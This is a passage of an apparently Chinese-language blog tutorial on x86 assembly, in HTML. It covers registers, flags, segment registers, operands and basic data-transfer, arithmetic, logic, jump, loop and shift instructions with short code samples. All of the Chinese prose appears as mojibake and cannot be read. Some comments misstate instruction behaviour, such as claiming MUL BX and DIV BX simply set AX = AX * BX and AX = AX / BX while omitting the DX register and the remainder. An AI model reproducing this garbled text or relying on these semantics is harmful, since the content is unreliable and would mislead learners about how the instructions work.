id="1-16ä½å¯„å­˜å™¨"><a href="#1-16ä½å¯„å­˜å™¨" class="headerlink" title="1. 16ä½å¯„å­˜å™¨"></a>1. 16ä½å¯„å­˜å™¨</h4><p>æ—©æœŸçš„ x86 å¤„ç†å™¨ä½¿ç”¨ 16 ä½å¯„å­˜å™¨ï¼Œä¸»è¦ç”¨äº 8086 å’Œ 80286 å¤„ç†å™¨ã€‚å¸¸è§çš„ 16 ä½å¯„å­˜å™¨åŒ…æ‹¬ï¼š</p><ul><li><p><strong>AX</strong>ï¼šç´¯åŠ å™¨ï¼ˆAccumulatorï¼‰ï¼Œç”¨äºç®—æœ¯è¿ç®—å’Œæ•°æ®ä¼ è¾“ã€‚</p></li><li><p><strong>BX</strong>ï¼šåŸºå€å¯„å­˜å™¨ï¼ˆBase Registerï¼‰ï¼Œå¸¸ç”¨äºå­˜å‚¨æ•°æ®çš„å†…å­˜åœ°å€ã€‚</p></li><li><p><strong>CX</strong>ï¼šè®¡æ•°å™¨ï¼ˆCounterï¼‰ï¼Œå¸¸ç”¨äºå¾ªç¯å’Œè®¡æ•°æ“ä½œã€‚</p></li><li><p><strong>DX</strong>ï¼šæ•°æ®å¯„å­˜å™¨ï¼ˆData Registerï¼‰ï¼Œç”¨äº I&#x2F;O æ“ä½œå’Œæ‰©å±•ä¹˜æ³•ã€é™¤æ³•æŒ‡ä»¤ã€‚</p></li></ul><p>è¿™å››ä¸ªå¯„å­˜å™¨è¿˜å¯ä»¥æ‹†åˆ†ä¸ºä¸¤ä¸ª 8 ä½å¯„å­˜å™¨ï¼š</p><ul><li><p><strong>AH</strong> å’Œ <strong>AL</strong>ï¼šAX çš„é«˜ 8 ä½å’Œä½ 8 ä½ã€‚</p></li><li><p><strong>BH</strong> å’Œ <strong>BL</strong>ï¼šBX çš„é«˜ 8 ä½å’Œä½ 8 ä½ã€‚</p></li><li><p><strong>CH</strong> å’Œ <strong>CL</strong>ï¼šCX çš„é«˜ 8 ä½å’Œä½ 8 ä½ã€‚</p></li><li><p><strong>DH</strong> å’Œ <strong>DL</strong>ï¼šDX çš„é«˜ 8 ä½å’Œä½ 8 ä½ã€‚</p></li></ul><p>æ­¤å¤–ï¼Œ16 ä½å¯„å­˜å™¨è¿˜åŒ…æ‹¬ï¼š</p><ul><li><p><strong>SP</strong>ï¼šå †æ ˆæŒ‡é’ˆï¼ˆStack Pointerï¼‰ï¼ŒæŒ‡å‘å½“å‰æ ˆé¡¶çš„ä½ç½®ã€‚</p></li><li><p><strong>BP</strong>ï¼šåŸºå€æŒ‡é’ˆï¼ˆBase Pointerï¼‰ï¼Œå¸¸ç”¨äºæŒ‡å‘æ ˆä¸­çš„æ•°æ®ã€‚</p></li><li><p><strong>SI</strong>ï¼šæºç´¢å¼•ï¼ˆSource Indexï¼‰ï¼Œå¸¸ç”¨äºå­—ç¬¦ä¸²æ“ä½œä¸­çš„æºåœ°å€ã€‚</p></li><li><p><strong>DI</strong>ï¼šç›®æ ‡ç´¢å¼•ï¼ˆDestination Indexï¼‰ï¼Œå¸¸ç”¨äºå­—ç¬¦ä¸²æ“ä½œä¸­çš„ç›®æ ‡åœ°å€ã€‚</p></li></ul><h4 id="2-32ä½å¯„å­˜å™¨"><a href="#2-32ä½å¯„å­˜å™¨" class="headerlink" title="2. 32ä½å¯„å­˜å™¨"></a>2. 32ä½å¯„å­˜å™¨</h4><p>éšç€ 80386 å¤„ç†å™¨çš„æ¨å‡ºï¼Œå¯„å­˜å™¨æ‰©å±•ä¸º 32 ä½ã€‚16 ä½å¯„å­˜å™¨å‰é¢åŠ ä¸Šäº† <code>E</code> å‰ç¼€ï¼Œè¡¨ç¤ºæ‰©å±•ä¸º 32 ä½ã€‚ä¾‹å¦‚ï¼š</p><ul><li><p><strong>EAX</strong>ï¼š32 ä½çš„ç´¯åŠ å™¨ã€‚</p></li><li><p><strong>EBX</strong>ï¼š32 ä½çš„åŸºå€å¯„å­˜å™¨ã€‚</p></li><li><p><strong>ECX</strong>ï¼š32 ä½çš„è®¡æ•°å™¨ã€‚</p></li><li><p><strong>EDX</strong>ï¼š32 ä½çš„æ•°æ®å¯„å­˜å™¨ã€‚</p></li></ul><p>åŒæ ·ï¼Œå †æ ˆæŒ‡é’ˆã€åŸºå€æŒ‡é’ˆå’Œç´¢å¼•å¯„å­˜å™¨ä¹Ÿæ‰©å±•ä¸º 32 ä½ï¼š</p><ul><li><p><strong>ESP</strong>ï¼š32 ä½çš„æ ˆæŒ‡é’ˆã€‚</p></li><li><p><strong>EBP</strong>ï¼š32 ä½çš„åŸºå€æŒ‡é’ˆã€‚</p></li><li><p><strong>ESI</strong>ï¼š32 ä½çš„æºç´¢å¼•ã€‚</p></li><li><p><strong>EDI</strong>ï¼š32 ä½çš„ç›®æ ‡ç´¢å¼•ã€‚</p></li></ul><h4 id="3-64ä½å¯„å­˜å™¨"><a href="#3-64ä½å¯„å­˜å™¨" class="headerlink" title="3. 64ä½å¯„å­˜å™¨"></a>3. 64ä½å¯„å­˜å™¨</h4><p>åœ¨ x86-64 æ¶æ„ä¸­ï¼Œå¯„å­˜å™¨å†æ¬¡æ‰©å±•ä¸º 64 ä½ï¼Œ16 ä¸ªé€šç”¨å¯„å­˜å™¨åˆ†åˆ«ä»¥ <code>R</code> ä¸ºå‰ç¼€ã€‚å¸¸è§çš„ 64 ä½å¯„å­˜å™¨æœ‰ï¼š</p><ul><li><p><strong>RAX</strong>ï¼š64 ä½çš„ç´¯åŠ å™¨ã€‚</p></li><li><p><strong>RBX</strong>ï¼š64 ä½çš„åŸºå€å¯„å­˜å™¨ã€‚</p></li><li><p><strong>RCX</strong>ï¼š64 ä½çš„è®¡æ•°å™¨ã€‚</p></li><li><p><strong>RDX</strong>ï¼š64 ä½çš„æ•°æ®å¯„å­˜å™¨ã€‚</p></li><li><p><strong>RSP</strong>ï¼š64 ä½çš„æ ˆæŒ‡é’ˆã€‚</p></li><li><p><strong>RBP</strong>ï¼š64 ä½çš„åŸºå€æŒ‡é’ˆã€‚</p></li><li><p><strong>RSI</strong>ï¼š64 ä½çš„æºç´¢å¼•ã€‚</p></li><li><p><strong>RDI</strong>ï¼š64 ä½çš„ç›®æ ‡ç´¢å¼•ã€‚</p></li></ul><p>æ­¤å¤–ï¼Œåœ¨ x86-64 ä¸­è¿˜æ–°å¢äº† 8 ä¸ªé€šç”¨å¯„å­˜å™¨ï¼š</p><ul><li><strong>R8</strong> åˆ° <strong>R15</strong>ï¼šé¢å¤–çš„ 64 ä½é€šç”¨å¯„å­˜å™¨ã€‚</li></ul><p>è¿™äº›å¯„å­˜å™¨ä¹Ÿå¯ä»¥è®¿é—®ä½ 32 ä½ã€16 ä½ã€ç”šè‡³ 8 ä½çš„æ•°æ®ã€‚ä¾‹å¦‚ï¼Œ<code>R8</code> çš„ä½ 32 ä½æ˜¯ <code>R8D</code>ï¼Œä½ 16 ä½æ˜¯ <code>R8W</code>ï¼Œä½ 8 ä½æ˜¯ <code>R8B</code>ã€‚</p><h4 id="4-æ ‡å¿—å¯„å­˜å™¨"><a href="#4-æ ‡å¿—å¯„å­˜å™¨" class="headerlink" title="4. æ ‡å¿—å¯„å­˜å™¨"></a>4. æ ‡å¿—å¯„å­˜å™¨</h4><p>æ ‡å¿—å¯„å­˜å™¨ç”¨äºå­˜å‚¨ç®—æœ¯è¿ç®—çš„ç»“æœçŠ¶æ€ï¼Œå®ƒçš„æ¯ä¸€ä½ä»£è¡¨ä¸€ä¸ªç‰¹å®šçš„æ ‡å¿—ã€‚ä¾‹å¦‚ï¼š</p><ul><li><p><strong>ZF</strong>ï¼ˆZero Flagï¼‰ï¼šå¦‚æœè¿ç®—ç»“æœä¸º 0ï¼Œåˆ™è®¾ç½®è¯¥æ ‡å¿—ã€‚</p></li><li><p><strong>CF</strong>ï¼ˆCarry Flagï¼‰ï¼šå¦‚æœè¿ç®—äº§ç”Ÿäº†è¿›ä½æˆ–å€Ÿä½ï¼Œåˆ™è®¾ç½®è¯¥æ ‡å¿—ã€‚</p></li><li><p><strong>SF</strong>ï¼ˆSign Flagï¼‰ï¼šå¦‚æœè¿ç®—ç»“æœä¸ºè´Ÿæ•°ï¼Œåˆ™è®¾ç½®è¯¥æ ‡å¿—ã€‚</p></li><li><p><strong>OF</strong>ï¼ˆOverflow Flagï¼‰ï¼šå¦‚æœæœ‰ç¬¦å·è¿ç®—æº¢å‡ºï¼Œåˆ™è®¾ç½®è¯¥æ ‡å¿—ã€‚</p></li></ul><h4 id="5-æ®µå¯„å­˜å™¨"><a href="#5-æ®µå¯„å­˜å™¨" class="headerlink" title="5. æ®µå¯„å­˜å™¨"></a>5. æ®µå¯„å­˜å™¨</h4><p>16 ä½å’Œ 32 ä½æ±‡ç¼–ä¸­ä½¿ç”¨æ®µå¯„å­˜å™¨æ¥æè¿°å†…å­˜çš„ä¸åŒæ®µï¼š</p><ul><li><p><strong>CS</strong>ï¼šä»£ç æ®µå¯„å­˜å™¨ï¼ˆCode Segmentï¼‰ï¼ŒæŒ‡å‘æ­£åœ¨æ‰§è¡Œçš„ä»£ç æ®µã€‚</p></li><li><p><strong>DS</strong>ï¼šæ•°æ®æ®µå¯„å­˜å™¨ï¼ˆData Segmentï¼‰ï¼ŒæŒ‡å‘æ•°æ®æ‰€åœ¨çš„æ®µã€‚</p></li><li><p><strong>SS</strong>ï¼šå †æ ˆæ®µå¯„å­˜å™¨ï¼ˆStack Segmentï¼‰ï¼ŒæŒ‡å‘æ ˆæ‰€åœ¨çš„æ®µã€‚</p></li><li><p><strong>ES</strong>ã€<strong>FS</strong>ã€<strong>GS</strong>ï¼šé¢å¤–æ®µå¯„å­˜å™¨ï¼Œå¸¸ç”¨äºé¢å¤–çš„æ•°æ®æ®µã€‚</p></li></ul><p>åœ¨ 64 ä½æ¨¡å¼ä¸‹ï¼Œæ®µå¯„å­˜å™¨çš„ä½¿ç”¨æœ‰æ‰€å‡å°‘ï¼Œç»å¤§éƒ¨åˆ†ç¨‹åºä¸å†ä¾èµ–æ®µå¯„å­˜å™¨ã€‚</p><img src="/post/47670/1729407589499-a7043269-2d09-4055-a3e9-19f14e1e02e7-1735222654796-155.png" class="" title="img"><h3 id="2-2-æ“ä½œæ•°"><a href="#2-2-æ“ä½œæ•°" class="headerlink" title="2.2 æ“ä½œæ•°"></a>2.2 æ“ä½œæ•°</h3><p>æ±‡ç¼–è¯­è¨€ä¸­çš„æŒ‡ä»¤é€šå¸¸ç”±æ“ä½œç ï¼ˆopcodeï¼‰å’Œæ“ä½œæ•°ï¼ˆoperandï¼‰ç»„æˆã€‚æ“ä½œæ•°å¯ä»¥æ˜¯ï¼š</p><ul><li><p><strong>ç«‹å³æ•°</strong>ï¼šå¦‚ <code>5</code>ã€<code>0x10</code>ï¼Œç›´æ¥è¡¨ç¤ºä¸€ä¸ªå¸¸é‡ã€‚</p></li><li><p><strong>å¯„å­˜å™¨</strong>ï¼šå¦‚ <code>AX</code>ã€<code>BX</code>ï¼Œè¡¨ç¤ºå¯„å­˜å™¨ä¸­çš„å€¼ã€‚</p></li><li><p><strong>å†…å­˜åœ°å€</strong>ï¼šå¦‚ <code>[0x1000]</code>ï¼Œè¡¨ç¤ºæŸä¸ªå†…å­˜åœ°å€ä¸­çš„å€¼ã€‚</p></li></ul><h3 id="2-3-æŒ‡ä»¤"><a href="#2-3-æŒ‡ä»¤" class="headerlink" title="2.3 æŒ‡ä»¤"></a>2.3 æŒ‡ä»¤</h3><p>æŒ‡ä»¤æ˜¯æ±‡ç¼–è¯­è¨€çš„æœ€å°æ‰§è¡Œå•å…ƒã€‚å¸¸è§çš„æŒ‡ä»¤ç±»å‹åŒ…æ‹¬ï¼š</p><ul><li><p><strong>æ•°æ®ä¼ è¾“æŒ‡ä»¤</strong>ï¼šå¦‚ <code>MOV</code>ï¼Œç”¨äºåœ¨å¯„å­˜å™¨ã€å†…å­˜ã€ç«‹å³æ•°ä¹‹é—´ä¼ é€’æ•°æ®ã€‚</p></li><li><p><strong>ç®—æœ¯è¿ç®—æŒ‡ä»¤</strong>ï¼šå¦‚ <code>ADD</code>ã€<code>SUB</code>ã€<code>MUL</code>ï¼Œç”¨äºæ‰§è¡ŒåŠ æ³•ã€å‡æ³•ã€ä¹˜æ³•ç­‰è¿ç®—ã€‚</p></li><li><p><strong>é€»è¾‘è¿ç®—æŒ‡ä»¤</strong>ï¼šå¦‚ <code>AND</code>ã€<code>OR</code>ã€<code>XOR</code>ï¼Œç”¨äºæ‰§è¡Œä½è¿ç®—ã€‚</p></li><li><p><strong>æ§åˆ¶æµæŒ‡ä»¤</strong>ï¼šå¦‚ <code>JMP</code>ã€<code>CALL</code>ã€<code>RET</code>ï¼Œç”¨äºæ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚</p></li></ul><h2 id="3-æ±‡ç¼–è¯­è¨€çš„åŸºæœ¬è¯­æ³•"><a href="#3-æ±‡ç¼–è¯­è¨€çš„åŸºæœ¬è¯­æ³•" class="headerlink" title="3. æ±‡ç¼–è¯­è¨€çš„åŸºæœ¬è¯­æ³•"></a>3. æ±‡ç¼–è¯­è¨€çš„åŸºæœ¬è¯­æ³•</h2><h3 id="3-1-æ ¼å¼"><a href="#3-1-æ ¼å¼" class="headerlink" title="3.1 æ ¼å¼"></a>3.1 æ ¼å¼</h3><p>æ±‡ç¼–è¯­è¨€é€šå¸¸åˆ†ä¸ºä»¥ä¸‹å‡ éƒ¨åˆ†ï¼š</p><ol><li><p><strong>æŒ‡ä»¤åŠ©è®°ç¬¦</strong>ï¼šè¡¨ç¤ºå…·ä½“çš„æ“ä½œï¼Œå¦‚ <code>MOV</code>ã€<code>ADD</code> ç­‰ã€‚</p></li><li><p><strong>æ“ä½œæ•°</strong>ï¼šæŒ‡ä»¤çš„æ“ä½œå¯¹è±¡ï¼Œå¯ä»¥æ˜¯å¯„å­˜å™¨ã€ç«‹å³æ•°ã€å†…å­˜åœ°å€ç­‰ã€‚</p></li><li><p><strong>æ³¨é‡Š</strong>ï¼šä»¥ <code>;</code> å¼€å¤´ï¼Œè¡¨ç¤ºå¯¹ä»£ç çš„è¯´æ˜ï¼Œä¸å‚ä¸ç¨‹åºæ‰§è¡Œã€‚</p></li></ol><p>ä¾‹å¦‚ï¼Œx86 æ±‡ç¼–ä»£ç çš„ä¸€æ¡æŒ‡ä»¤å¯èƒ½å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">MOV AX, 5    ; å°†ç«‹å³æ•° 5 èµ‹å€¼ç»™å¯„å­˜å™¨ AX<br></code></pre></td></tr></table></figure><h3 id="3-2-åŸºæœ¬æŒ‡ä»¤"><a href="#3-2-åŸºæœ¬æŒ‡ä»¤" class="headerlink" title="3.2 åŸºæœ¬æŒ‡ä»¤"></a>3.2 åŸºæœ¬æŒ‡ä»¤</h3><h4 id="3-2-1-æ•°æ®ä¼ è¾“æŒ‡ä»¤"><a href="#3-2-1-æ•°æ®ä¼ è¾“æŒ‡ä»¤" class="headerlink" title="3.2.1 æ•°æ®ä¼ è¾“æŒ‡ä»¤"></a>3.2.1 æ•°æ®ä¼ è¾“æŒ‡ä»¤</h4><h5 id="1-MOV"><a href="#1-MOV" class="headerlink" title="1. MOV"></a>1. MOV</h5><p>æ•°æ®ä¼ é€æŒ‡ä»¤</p><p><code>MOV</code> æŒ‡ä»¤ç”¨äºå°†æ•°æ®ä»ä¸€ä¸ªåœ°æ–¹ä¼ é€åˆ°å¦ä¸€ä¸ªåœ°æ–¹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">MOV AX, 10        ; å°†ç«‹å³æ•° 10 èµ‹å€¼ç»™ AX å¯„å­˜å™¨<br>MOV BX, AX       ; å°† AX çš„å€¼å¤åˆ¶åˆ° BX<br>MOV [0x1000], AX ; å°† AX çš„å€¼å­˜å‚¨åˆ°å†…å­˜åœ°å€ 0x1000<br></code></pre></td></tr></table></figure><h5 id="2-XCHG"><a href="#2-XCHG" class="headerlink" title="2. XCHG"></a>2. XCHG</h5><p>äº¤æ¢æŒ‡ä»¤</p><p><code>XCHG</code> æŒ‡ä»¤ç”¨äºäº¤æ¢ä¸¤ä¸ªæ“ä½œæ•°çš„å€¼ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">XCHG AX, BX      ; äº¤æ¢ AX å’Œ BX ä¸­çš„å€¼<br></code></pre></td></tr></table></figure><h5 id="3-PUSH-POP"><a href="#3-PUSH-POP" class="headerlink" title="3. PUSH &amp;POP"></a>3. PUSH &amp;POP</h5><p>å †æ ˆæ“ä½œæŒ‡ä»¤</p><p><code>PUSH</code> å’Œ <code>POP</code> æŒ‡ä»¤ç”¨äºå°†æ•°æ®å‹å…¥æ ˆæˆ–ä»æ ˆä¸­å¼¹å‡ºã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">PUSH AX          ; å°† AX çš„å€¼å‹å…¥æ ˆ<br>POP BX           ; ä»æ ˆä¸­å¼¹å‡ºå€¼å­˜å…¥ BX<br></code></pre></td></tr></table></figure><h4 id="3-2-2-ç®—æœ¯è¿ç®—æŒ‡ä»¤"><a href="#3-2-2-ç®—æœ¯è¿ç®—æŒ‡ä»¤" class="headerlink" title="3.2.2 ç®—æœ¯è¿ç®—æŒ‡ä»¤"></a>3.2.2 ç®—æœ¯è¿ç®—æŒ‡ä»¤</h4><h5 id="1-ADD"><a href="#1-ADD" class="headerlink" title="1. ADD"></a>1. ADD</h5><p>åŠ æ³•æŒ‡ä»¤</p><p><code>ADD</code> æŒ‡ä»¤ç”¨äºæ‰§è¡ŒåŠ æ³•è¿ç®—ï¼Œå¹¶å°†ç»“æœå­˜å‚¨åœ¨ç¬¬ä¸€ä¸ªæ“ä½œæ•°ä¸­ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">ADD AX, BX       ; å°† AX å’Œ BX çš„å€¼ç›¸åŠ ï¼Œç»“æœå­˜å‚¨åœ¨ AX ä¸­<br></code></pre></td></tr></table></figure><h5 id="2-SUB"><a href="#2-SUB" class="headerlink" title="2. SUB"></a>2. SUB</h5><p>å‡æ³•æŒ‡ä»¤</p><p><code>SUB</code> æŒ‡ä»¤ç”¨äºæ‰§è¡Œå‡æ³•è¿ç®—ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">SUB AX, 5        ; ä» AX ä¸­å‡å» 5ï¼Œç»“æœå­˜å‚¨åœ¨ AX ä¸­<br></code></pre></td></tr></table></figure><h5 id="3-INC-DEC"><a href="#3-INC-DEC" class="headerlink" title="3. INC &amp; DEC"></a>3. INC &amp; DEC</h5><p>è‡ªå¢æŒ‡ä»¤å’Œè‡ªå‡æŒ‡ä»¤</p><ul><li><p><code>INC</code> æŒ‡ä»¤ç”¨äºå°†æ“ä½œæ•°åŠ  1ã€‚</p></li><li><p><code>DEC</code> æŒ‡ä»¤ç”¨äºå°†æ“ä½œæ•°å‡ 1ã€‚</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">INC AX           ; å°† AX çš„å€¼åŠ  1<br>DEC BX           ; å°† BX çš„å€¼å‡ 1<br></code></pre></td></tr></table></figure><h5 id="4-MUL-IMUL"><a href="#4-MUL-IMUL" class="headerlink" title="4. MUL &amp; IMUL"></a>4. MUL &amp; IMUL</h5><p>MULå’ŒIMULä¹˜æ³•æŒ‡ä»¤</p><ul><li><p><code>MUL</code> æŒ‡ä»¤ç”¨äºæ— ç¬¦å·ä¹˜æ³•ã€‚</p></li><li><p><code>IMUL</code> æŒ‡ä»¤ç”¨äºæœ‰ç¬¦å·ä¹˜æ³•ã€‚</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">MUL BX           ; æ— ç¬¦å·ä¹˜æ³•ï¼ŒAX = AX * BX<br>IMUL BX          ; æœ‰ç¬¦å·ä¹˜æ³•ï¼ŒAX = AX * BX<br></code></pre></td></tr></table></figure><h5 id="5-DIV-IDIV"><a href="#5-DIV-IDIV" class="headerlink" title="5. DIV &amp; IDIV"></a>5. DIV &amp; IDIV</h5><p>é™¤æ³•æŒ‡ä»¤</p><ul><li><p><code>DIV</code> æŒ‡ä»¤ç”¨äºæ— ç¬¦å·é™¤æ³•ã€‚</p></li><li><p><code>IDIV</code> æŒ‡ä»¤ç”¨äºæœ‰ç¬¦å·é™¤æ³•ã€‚</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">DIV BX           ; æ— ç¬¦å·é™¤æ³•ï¼ŒAX = AX / BX<br>IDIV BX          ; æœ‰ç¬¦å·é™¤æ³•ï¼ŒAX = AX / BX<br></code></pre></td></tr></table></figure><h4 id="3-2-3-é€»è¾‘è¿ç®—æŒ‡ä»¤"><a href="#3-2-3-é€»è¾‘è¿ç®—æŒ‡ä»¤" class="headerlink" title="3.2.3 é€»è¾‘è¿ç®—æŒ‡ä»¤"></a>3.2.3 é€»è¾‘è¿ç®—æŒ‡ä»¤</h4><h5 id="1-AND"><a href="#1-AND" class="headerlink" title="1. AND"></a>1. AND</h5><p>æŒ‰ä½ä¸æŒ‡ä»¤</p><p><code>AND</code> æŒ‡ä»¤å¯¹ä¸¤ä¸ªæ“ä½œæ•°è¿›è¡ŒæŒ‰ä½ä¸è¿ç®—ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">AND AX, BX       ; AX = AX &amp; BX<br></code></pre></td></tr></table></figure><h5 id="2-OR"><a href="#2-OR" class="headerlink" title="2. OR"></a>2. OR</h5><p>æŒ‰ä½æˆ–æŒ‡ä»¤</p><p><code>OR</code> æŒ‡ä»¤å¯¹ä¸¤ä¸ªæ“ä½œæ•°è¿›è¡ŒæŒ‰ä½æˆ–è¿ç®—ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">OR AX, BX        ; AX = AX | BX<br></code></pre></td></tr></table></figure><h5 id="3-XOR"><a href="#3-XOR" class="headerlink" title="3. XOR"></a>3. XOR</h5><p>æŒ‰ä½å¼‚æˆ–æŒ‡ä»¤</p><p><code>XOR</code> æŒ‡ä»¤å¯¹ä¸¤ä¸ªæ“ä½œæ•°è¿›è¡ŒæŒ‰ä½å¼‚æˆ–è¿ç®—ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">XOR AX, BX       ; AX = AX ^ BX<br></code></pre></td></tr></table></figure><h5 id="4-NOT"><a href="#4-NOT" class="headerlink" title="4. NOT"></a>4. NOT</h5><p>å–åæŒ‡ä»¤</p><p><code>NOT</code> æŒ‡ä»¤å¯¹æ“ä½œæ•°è¿›è¡ŒæŒ‰ä½å–åã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">NOT AX           ; AX = ~AX<br></code></pre></td></tr></table></figure><h4 id="3-2-4-æ§åˆ¶æµæŒ‡ä»¤"><a href="#3-2-4-æ§åˆ¶æµæŒ‡ä»¤" class="headerlink" title="3.2.4 æ§åˆ¶æµæŒ‡ä»¤"></a>3.2.4 æ§åˆ¶æµæŒ‡ä»¤</h4><h5 id="1-JMP"><a href="#1-JMP" class="headerlink" title="1. JMP"></a>1. JMP</h5><p>æ— æ¡ä»¶è·³è½¬æŒ‡ä»¤</p><p><code>JMP</code> æŒ‡ä»¤ç”¨äºæ— æ¡ä»¶è·³è½¬åˆ°ç¨‹åºä¸­çš„æŸä¸ªæ ‡ç­¾ä½ç½®ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">JMP start        ; è·³è½¬åˆ°æ ‡ç­¾ start å¤„ç»§ç»­æ‰§è¡Œ<br></code></pre></td></tr></table></figure><h5 id="2-CMP"><a href="#2-CMP" class="headerlink" title="2. CMP"></a>2. CMP</h5><p><code>CMP</code> æŒ‡ä»¤æ¯”è¾ƒä¸¤ä¸ªæ“ä½œæ•°ï¼Œå¹¶æ ¹æ®ç»“æœè®¾ç½®æ ‡å¿—å¯„å­˜å™¨ã€‚å¸¸ä¸æ¡ä»¶è·³è½¬æŒ‡ä»¤ï¼ˆå¦‚ <code>JE</code>ã€<code>JNE</code>ã€<code>JG</code>ã€<code>JL</code> ç­‰ï¼‰é…åˆä½¿ç”¨ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">CMP AX, BX       ; æ¯”è¾ƒ AX å’Œ BX<br>JE equal         ; å¦‚æœ AX ç­‰äº BXï¼Œè·³è½¬åˆ° equal æ ‡ç­¾<br>JNE notequal     ; å¦‚æœ AX ä¸ç­‰äº BXï¼Œè·³è½¬åˆ° notequal æ ‡ç­¾<br></code></pre></td></tr></table></figure><p>å¸¸è§çš„æ¡ä»¶è·³è½¬æŒ‡ä»¤ï¼š</p><ul><li><p><strong>JE</strong> &#x2F; <strong>JZ</strong>ï¼šç­‰äº &#x2F; é›¶æ—¶è·³è½¬ï¼ˆJump if Equal &#x2F; Zeroï¼‰ã€‚</p></li><li><p><strong>JNE</strong> &#x2F; <strong>JNZ</strong>ï¼šä¸ç­‰äº &#x2F; éé›¶æ—¶è·³è½¬ï¼ˆJump if Not Equal &#x2F; Not Zeroï¼‰ã€‚</p></li><li><p><strong>JG</strong> &#x2F; <strong>JNLE</strong>ï¼šå¤§äºæ—¶è·³è½¬ï¼ˆJump if Greaterï¼‰ã€‚</p></li><li><p><strong>JL</strong> &#x2F; <strong>JNGE</strong>ï¼šå°äºæ—¶è·³è½¬ï¼ˆJump if Lessï¼‰ã€‚</p></li><li><p><strong>JGE</strong>ï¼šå¤§äºç­‰äºæ—¶è·³è½¬ï¼ˆJump if Greater or Equalï¼‰ã€‚</p></li><li><p><strong>JLE</strong>ï¼šå°äºç­‰äºæ—¶è·³è½¬ï¼ˆJump if Less or Equalï¼‰ã€‚</p></li></ul><h5 id="3-CALL-RET"><a href="#3-CALL-RET" class="headerlink" title="3. CALL &amp; RET"></a>3. CALL &amp; RET</h5><p>å‡½æ•°è°ƒç”¨ä¸è¿”å›æŒ‡ä»¤</p><p><code>CALL</code> æŒ‡ä»¤ç”¨äºè°ƒç”¨å­ç¨‹åºï¼Œ<code>RET</code> æŒ‡ä»¤ç”¨äºä»å­ç¨‹åºè¿”å›ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">CALL func        ; è°ƒç”¨å‡½æ•° func<br>RET              ; ä»å‡½æ•°è¿”å›<br></code></pre></td></tr></table></figure><h5 id="4-LOOP"><a href="#4-LOOP" class="headerlink" title="4. LOOP"></a>4. LOOP</h5><p>å¾ªç¯æŒ‡ä»¤</p><p><code>LOOP</code> æŒ‡ä»¤ç”¨äºå¾ªç¯æ“ä½œï¼Œä¾èµ–äº <code>CX</code> æˆ– <code>ECX</code> å¯„å­˜å™¨çš„å€¼ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">MOV CX, 10       ; å°† 10 èµ‹å€¼ç»™ CX<br>loop_start:<br>    ; å¾ªç¯ä½“<br>    LOOP loop_start  ; CX = CX - 1ï¼Œè‹¥ CX ä¸ä¸º 0ï¼Œåˆ™è·³è½¬åˆ° loop_start<br></code></pre></td></tr></table></figure><h4 id="3-2-5-ä½ç§»æŒ‡ä»¤"><a href="#3-2-5-ä½ç§»æŒ‡ä»¤" class="headerlink" title="3.2.5 ä½ç§»æŒ‡ä»¤"></a>3.2.5 ä½ç§»æŒ‡ä»¤</h4><h5 id="1-SHL-SAL"><a href="#1-SHL-SAL" class="headerlink" title="1. SHL &amp; SAL"></a>1. SHL &amp; SAL</h5><p>å·¦ç§»æŒ‡ä»¤</p><ul><li><p><strong>SHL</strong>ï¼ˆShift Logical Leftï¼‰ï¼šé€»è¾‘å·¦ç§»ï¼Œç©ºå‡ºçš„ä½ç”¨ 0 å¡«å……ã€‚</p></li><li><p><strong>SAL</strong>ï¼ˆShift Arithmetic Leftï¼‰ï¼šç®—æœ¯å·¦ç§»ï¼Œä¸ SHL ç›¸åŒã€‚</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">SHL AX, 1        ; å°† AX å·¦ç§» 1 ä½<br></code></pre></td></tr></table></figure><h5 id="2-SHR-SAR"><a href="#2-SHR-SAR" class="headerlink" title="2. SHR&amp; SAR"></a>2. SHR&amp; 